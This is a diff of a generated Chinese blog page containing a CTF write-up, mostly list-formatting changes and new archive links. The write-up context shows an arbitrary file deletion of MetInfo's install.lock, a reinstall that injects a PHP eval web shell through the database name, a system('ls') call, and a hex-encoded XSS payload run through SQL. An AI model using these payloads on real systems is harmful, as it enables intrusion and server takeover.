@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">700</span> / Reading time: <span class="post-count">4 min</span></span>
+                        <span>Word count: <span class="post-count">695</span> / Reading time: <span class="post-count">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,25 +396,18 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><ol>
-<li><p>御剑扫描</p>
-</li>
-<li><p>经过目录扫描，发现<code>file/file.php</code></p>
+        <h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><p>御剑扫描</p>
+<p>经过目录扫描，发现<code>file/file.php</code></p>
 <p>根据网页最后提示:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE FILE</span><br><span class="line">Sorry,no filename!</span><br></pre></td></tr></table></figure>
 <p>可以猜测存在任意文件删除漏洞。</p>
-</li>
-<li><p>首先我们删除<code>install.lock</code></p>
+<p>首先我们删除<code>install.lock</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>重装metinfo，重装的时候数据库名填写 </p>
+<p>重装metinfo，重装的时候数据库名填写 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">met#*/@eval($_GET[1]);/*</span><br></pre></td></tr></table></figure>
 <p>数据库密码为<code>root</code></p>
-</li>
-<li><p>执行shell即可</p>
+<p>执行shell即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
 <h2 id="mysqlonline"><a href="#mysqlonline" class="headerlink" title="mysqlonline"></a>mysqlonline</h2><p>首先通过mysql查询，经过hex编码在输出，可以造成xss。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x3c7363726970743e616c6572742831293c2f7363726970743e</span><br></pre></td></tr></table></figure>
 <p>结合CSRF即可打后台:</p>
@@ -1174,9 +1167,101 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 40
+        Total : 44
         </div>
         <!-- search  -->
         
@@ -1189,6 +1274,26 @@
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1402,6 +1507,8 @@
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
